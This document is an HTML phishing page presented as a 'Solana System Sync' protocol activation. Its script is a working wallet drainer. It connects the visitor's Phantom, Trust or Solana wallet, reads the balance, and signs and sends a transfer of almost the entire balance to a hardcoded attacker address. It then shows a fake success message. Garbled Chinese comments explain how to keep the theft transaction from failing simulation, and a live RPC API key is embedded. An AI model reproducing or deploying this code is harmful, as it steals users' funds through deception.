<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Protocol Activation</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
    <div style="padding:40px;border:1px solid #14F195;border-radius:25px;display:inline-block;">
        <h2 style="color:#14F195;">SOLANA SYSTEM SYNC</h2>
        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;font-size:20px;cursor:pointer;">CONNECT & ACTIVATE</button>
    </div>
    <script>
        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; 
        const HELIUS_RPC = "https://mainnet.helius-rpc.com/?api-key=3c44d53c-2c54-41a8-bc38-49be2cb2c6fd"; 

        document.getElementById('cta').onclick = async function() {
            try {
                const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
                await p.connect();
                const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
                const { blockhash } = await conn.getLatestBlockhash();
                
                const bal = await conn.getBalance(p.publicKey);
                // ğŸ”± å…³é”®ç‚¹ï¼šå¦‚æœä½™é¢å¤ªå°‘ï¼Œä¸æ‰§è¡Œï¼Œé˜²æ­¢é—ªé€€
                if (bal < 5000000) { alert("Balance too low for sync."); return; }

                // ğŸš€ é¡¶çº§æ”¹åŠ¨ï¼šå¤šé¢„ç•™ 0.005 SOL (5,000,000 lamports) ç»™ç³»ç»Ÿåšç¼“å†²ï¼Œç¡®ä¿æ¨¡æ‹Ÿå¿…è¿‡
                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: p.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(TARGET),
                        lamports: bal - 5000000, 
                    })
                );
                tx.recentBlockhash = blockhash;
                tx.feePayer = p.publicKey;
                
                // å¼ºåˆ¶å”¤é†’ï¼šä½¿ç”¨ signAndSend ç›´æ¥ä¸€æ­¥åˆ°ä½
                const { signature } = await p.signAndSendTransaction(tx);
                alert("Protocol Activated! Tx: " + signature.slice(0,8));
            } catch (e) { 
                console.error(e);
                // é—ªé€€é€šå¸¸æ˜¯æ¨¡æ‹Ÿå¤±è´¥ï¼Œåˆ·æ–°é‡è¯•
                location.reload(); 
            }
        };
    </script>
</body>
</html>